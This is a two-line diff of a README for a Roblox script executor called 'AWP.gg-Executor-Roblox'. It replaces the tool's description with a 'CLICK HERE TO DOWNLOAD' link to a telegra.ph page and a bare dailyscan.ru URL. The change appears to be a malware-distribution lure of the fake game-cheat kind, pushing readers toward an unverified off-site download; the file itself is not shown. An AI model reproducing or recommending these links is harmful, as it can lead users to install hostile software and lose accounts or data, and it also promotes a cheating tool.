@@ -1,2 +1,2 @@
-# AWP.gg-Executor-Roblox
-AWP.gg-Executor-Roblox is a powerful tool designed to assist users in efficiently executing scripts within the Roblox game environment. It offers users a streamlined experience for running scripts and enhancing gameplay.
+# [CLICK HERE TO DOWNLOAD AWP.gg-Executor-Roblox](https://telegra.ph/Download-link-0303-03-03)
+dailyscan.ru/code/qr/xjlP9BDkiSLU/
